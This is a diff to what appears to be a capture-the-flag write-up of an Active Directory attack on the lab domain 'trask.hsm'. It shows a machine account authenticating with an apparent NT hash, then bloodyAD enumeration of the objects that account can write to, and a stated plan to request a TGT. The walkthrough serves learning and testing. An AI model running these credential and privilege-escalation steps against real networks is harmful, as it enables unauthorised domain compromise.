@@ -931,3 +931,29 @@ SMB         dc01.trask.hsm  445    dc01             [*]  x64 (name:dc01) (domain
 SMB         dc01.trask.hsm  445    dc01             [+] trask.hsm\svc_mmold$:71fc6c4eb836275709e4e045ece2f9ec
 ```
 
+# Enumeration as `svc_mmold$`
+
+```python
+bloodyAD --host dc01.trask.hsm -d trask.hsm -k get writable
+
+distinguishedName: CN=TPM Devices,DC=trask,DC=hsm
+permission: CREATE_CHILD
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=trask,DC=hsm
+permission: WRITE
+
+distinguishedName: CN=Matt Mold,OU=Staff,DC=trask,DC=hsm
+permission: WRITE
+
+distinguishedName: CN=svc_mmold,OU=ServiceAccounts,DC=trask,DC=hsm
+permission: WRITE
+
+distinguishedName: DC=trask.hsm,CN=MicrosoftDNS,DC=DomainDnsZones,DC=trask,DC=hsm
+permission: CREATE_CHILD
+
+distinguishedName: DC=_msdcs.trask.hsm,CN=MicrosoftDNS,DC=ForestDnsZones,DC=trask,DC=hsm
+permission: CREATE_CHILD
+```
+
+Ill get a TGT and export it, and check writable objects
+
